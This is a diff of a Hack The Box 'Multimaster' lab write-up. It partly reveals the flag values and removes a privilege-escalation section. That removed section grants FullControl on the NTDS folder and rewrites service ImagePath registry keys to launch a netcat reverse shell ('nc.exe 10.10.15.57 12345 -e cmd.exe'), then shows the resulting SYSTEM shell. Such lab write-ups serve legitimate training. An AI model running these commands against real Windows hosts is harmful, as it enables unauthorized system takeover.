@@ -9,14 +9,10 @@ avatar: assets/htb/multimaster.png
 source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Multimaster
 ---
+
 ## Overview
 
 Hold on to your seats, because this Insane Windows machine is a wild ride. TODO:Finish this writeup, there are more notes and stuff in the notes app if anything is missing...
-
-## Useful Skills and Tools
-
-* description with generic example
-* description with generic example
 
 ## Enumeration
 
@@ -334,8 +330,6 @@ if __name__ == "__main__":
             i + = 1
 ```
 
-## Initial Foothold
-
 ## Road to User
 
 ### Further enumeration
@@ -356,7 +350,7 @@ Info: Establishing connection to remote endpoint
 
 ```text
 *Evil-WinRM* PS C:\Users\alcibiades\Desktop> cat user.txt
-****
+6043****4a2f
 ```
 
 ## Path to Power \(Gaining Administrator Access\)
@@ -1048,182 +1042,5 @@ Mode                LastWriteTime         Length Name
 -ar---        7/23/2020  10:08 PM             34 root.txt
 
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
-****
+fe23****b271
 ```
-
-### Getting Administrator Shell
-
-So now I have successfully exfiltrated the secret documents...but I want to own the system. Time to practice some more privilege escalation.
-
-```text
-*Evil-WinRM* PS C:\Users\jorden\Documents> $folder = "C:\Windows\NTDS"
-*Evil-WinRM* PS C:\Users\jorden\Documents> $acl = Get-ACL $folder
-*Evil-WinRM* PS C:\Users\jorden\Documents> $user = "MEGACORP\jorden"
-*Evil-WinRM* PS C:\Users\jorden\Documents> $aclperms = $user, "FullControl", "ContainerInherit, ObjectInherit","None","Allow"
-*Evil-WinRM* PS C:\Users\jorden\Documents> $aclrule = New-Object System.Security.AccessControl.FileSystemAccessRule $aclperms
-*Evil-WinRM* PS C:\Users\jorden\Documents> $acl.AddAccessRule($aclrule)
-*Evil-WinRM* PS C:\Users\jorden\Documents> Set-Acl -Path $folder -AclObject $acl
-*Evil-WinRM* PS C:\Users\jorden\Documents> Get-Acl $folder | fl
-
-Path   : Microsoft.PowerShell.Core\FileSystem::C:\Windows\NTDS
-Owner  : BUILTIN\Administrators
-Group  : MEGACORP\Domain Users
-Access : CREATOR OWNER Allow  268435456
-         NT AUTHORITY\SYSTEM Allow  268435456
-         NT AUTHORITY\SYSTEM Allow  FullControl
-         NT AUTHORITY\LOCAL SERVICE Allow  AppendData, Synchronize
-         BUILTIN\Administrators Allow  FullControl
-         BUILTIN\Administrators Allow  268435456
-         MEGACORP\jorden Allow  FullControl
-Audit  :
-Sddl   : O:BAG:DUD:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;FA;;;SY)(A;CI;0x100004;;;LS)(A;;FA;;;BA)(A;OICIIO;GA;;;BA)(A;OICI;FA;;;S-1-5-21-3167813660-1240564177-918740779-3110)
-```
-
-I'm sure there is a way I can backup ntds.dit From [https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers): But it seems like I need an admin prompt for this to work
-
-[https://decoder.cloud/2018/02/12/the-power-of-backup-operatos/](https://decoder.cloud/2018/02/12/the-power-of-backup-operatos/)
-
-```text
-REG add HKLM\System\CurrentControlSet\Services\WpnUserService_64360ac /v ImagePath /t REG_EXPAND_SZ /d "cmd.exe /c C:\Users\jorden\Documents\nc.exe 10.10.15.57 12345 -e cmd.exe" /f
-```
-
-Upload nc.exe, then start the service with `sc.exe start <service>`.
-
-```text
-*Evil-WinRM* PS C:\Users\jorden\Documents> sc.exe start WerSvc
-[SC] StartService FAILED 1053:
-
-The service did not respond to the start or control request in a timely fashion.
-
-*Evil-WinRM* PS C:\Users\jorden\Documents> REG add HKLM\System\CurrentControlSet\Services\Wecsvc /v ImagePath /t REG_EXPAND_SZ /d "cmd.exe /c C:\Users\jorden\Documents\nc.exe 10.10.15.57 12345 -e cmd.exe" /f
-The operation completed successfully.
-
-*Evil-WinRM* PS C:\Users\jorden\Documents> sc.exe start Wecsvc
-[SC] StartService FAILED 1053:
-
-The service did not respond to the start or control request in a timely fashion.
-
-*Evil-WinRM* PS C:\Users\jorden\Documents> REG add HKLM\System\CurrentControlSet\Services\wbengine /v ImagePath /t REG_EXPAND_SZ /d "cmd.exe /c C:\Users\jorden\Documents\nc.exe 10.10.15.57 12345 -e cmd.exe" /f
-The operation completed successfully.
-
-*Evil-WinRM* PS C:\Users\jorden\Documents> sc.exe start wbengine
-[SC] StartService: OpenService FAILED 1060:
-
-The specified service does not exist as an installed service.
-
-*Evil-WinRM* PS C:\Users\jorden\Documents> REG add HKLM\System\CurrentControlSet\Services\VSS /v ImagePath /t REG_EXPAND_SZ /d "cmd.exe /c C:\Users\jorden\Documents\nc.exe 10.10.15.57 12345 -e cmd.exe" /fThe operation completed successfully.
-
-*Evil-WinRM* PS C:\Users\jorden\Documents> sc.exe start VSS
-[SC] StartService FAILED 1053:
-
-The service did not respond to the start or control request in a timely fashion.*Evil-WinRM* PS C:\Users\jorden\Documents> sc.exe start WerSvc
-[SC] StartService FAILED 1053:
-
-The service did not respond to the start or control request in a timely fashion.
-
-*Evil-WinRM* PS C:\Users\jorden\Documents> REG add HKLM\System\CurrentControlSet\Services\Wecsvc /v ImagePath /t REG_EXPAND_SZ /d "cmd.exe /c C:\Users\jorden\Documents\nc.exe 10.10.15.57 12345 -e cmd.exe" /f
-The operation completed successfully.
-
-*Evil-WinRM* PS C:\Users\jorden\Documents> sc.exe start Wecsvc
-[SC] StartService FAILED 1053:
-
-The service did not respond to the start or control request in a timely fashion.
-
-*Evil-WinRM* PS C:\Users\jorden\Documents> REG add HKLM\System\CurrentControlSet\Services\wbengine /v ImagePath /t REG_EXPAND_SZ /d "cmd.exe /c C:\Users\jorden\Documents\nc.exe 10.10.15.57 12345 -e cmd.exe" /f
-The operation completed successfully.
-
-*Evil-WinRM* PS C:\Users\jorden\Documents> sc.exe start wbengine
-[SC] StartService: OpenService FAILED 1060:
-
-The specified service does not exist as an installed service.
-
-*Evil-WinRM* PS C:\Users\jorden\Documents> REG add HKLM\System\CurrentControlSet\Services\VSS /v ImagePath /t REG_EXPAND_SZ /d "cmd.exe /c C:\Users\jorden\Documents\nc.exe 10.10.15.57 12345 -e cmd.exe" /fThe operation completed successfully.
-
-*Evil-WinRM* PS C:\Users\jorden\Documents> sc.exe start VSS
-[SC] StartService FAILED 1053:
-
-The service did not respond to the start or control request in a timely fashion.
-```
-
-I had to try many services until I found one that would work. Even then, it said it failed to start the service, but I got my shell!
-
-```text
-zweilos@kalimaa:~/htb/multimaster$ nc -lvnp 12345
-listening on [any] 12345 ...
-connect to [10.10.15.57] from (UNKNOWN) [<YOUR_IP>] 49763
-Microsoft Windows [Version 10.0.14393]
-(c) 2016 Microsoft Corporation. All rights reserved.
-
-C:\Windows\system32>whoami /all
-whoami /all
-
-USER INFORMATION
-----------------
-
-User Name           SID     
-=================== ========
-nt authority\system S-1-5-18
-
-GROUP INFORMATION
------------------
-
-Group Name                                 Type             SID                                                             Attributes                                        
-========================================== ================ =============================================================== ==================================================
-Mandatory Label\System Mandatory Level     Label            S-1-16-16384                                                                                                      
-Everyone                                   Well-known group S-1-1-0                                                         Mandatory group, Enabled by default, Enabled group
-BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                                    Mandatory group, Enabled by default, Enabled group
-BUILTIN\Users                              Alias            S-1-5-32-545                                                    Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\SERVICE                       Well-known group S-1-5-6                                                         Mandatory group, Enabled by default, Enabled group
-CONSOLE LOGON                              Well-known group S-1-2-1                                                         Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                                        Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\This Organization             Well-known group S-1-5-15                                                        Mandatory group, Enabled by default, Enabled group
-NT SERVICE\VSS                             Well-known group S-1-5-80-3195062495-2862850656-3724129271-1847284719-4038691091 Enabled by default, Enabled group, Group owner    
-LOCAL                                      Well-known group S-1-2-0                                                         Mandatory group, Enabled by default, Enabled group
-BUILTIN\Administrators                     Alias            S-1-5-32-544                                                    Enabled by default, Enabled group, Group owner    
-
-PRIVILEGES INFORMATION
-----------------------
-
-Privilege Name                            Description                                                        State   
-========================================= ================================================================== ========
-SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
-SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled 
-SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
-SeTcbPrivilege                            Act as part of the operating system                                Enabled 
-SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
-SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
-SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
-SeSystemProfilePrivilege                  Profile system performance                                         Enabled 
-SeSystemtimePrivilege                     Change the system time                                             Disabled
-SeProfileSingleProcessPrivilege           Profile single process                                             Enabled 
-SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled 
-SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled 
-SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled 
-SeBackupPrivilege                         Back up files and directories                                      Disabled
-SeRestorePrivilege                        Restore files and directories                                      Disabled
-SeShutdownPrivilege                       Shut down the system                                               Disabled
-SeDebugPrivilege                          Debug programs                                                     Enabled 
-SeAuditPrivilege                          Generate security audits                                           Enabled 
-SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
-SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
-SeUndockPrivilege                         Remove computer from docking station                               Disabled
-SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
-SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled 
-SeCreateGlobalPrivilege                   Create global objects                                              Enabled 
-SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled 
-SeTimeZonePrivilege                       Change the time zone                                               Enabled 
-SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled 
-SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled 
-
-ERROR: Unable to get user claims information.
-
-C:\Windows\system32>
-```
-
-The process of replicating changes in one master copy of the account database to all other master copies is called a multimaster operation.
-
-limbernie
-
-### Finale
-
-MinatoTW & egre55 Thanks to [`<box_creator>`](https://www.hackthebox.eu/home/users/profile/<profile_num>) for .
